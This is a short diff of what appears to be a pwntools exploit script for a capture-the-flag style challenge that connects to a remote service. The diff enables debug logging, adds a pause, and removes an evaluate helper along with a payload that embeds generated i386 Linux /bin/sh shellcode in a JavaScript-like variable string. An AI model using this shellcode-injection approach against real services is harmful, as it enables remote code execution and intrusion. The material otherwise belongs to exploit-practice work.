@@ -12,7 +12,7 @@ if DEBUG:
 else:
     io = remote(sys.argv[1], int(sys.argv[2]))
 
-#if DEBUG: context(log_level='debug')
+if DEBUG: context(log_level='debug')
 # define symbols and offsets here
 
 # simplified r/s function
@@ -43,20 +43,13 @@ def dehex(s):
     return s.replace(' ','').decode('hex')
 
 # define interactive functions here
-def evaluate(s):
-    ru('> ')
-    sl(s)
-    return
-
-shellcode = asm(shellcraft.i386.linux.sh())
 
 # define exploit function here
 def pwn():
-    payload = 'var add = "{}"'.format(shellcode)
-    evaluate(payload)
-    evaluate('1 + 1')
+    
     io.interactive()
     return
 
 if __name__ == '__main__':
+    pause()
     pwn()
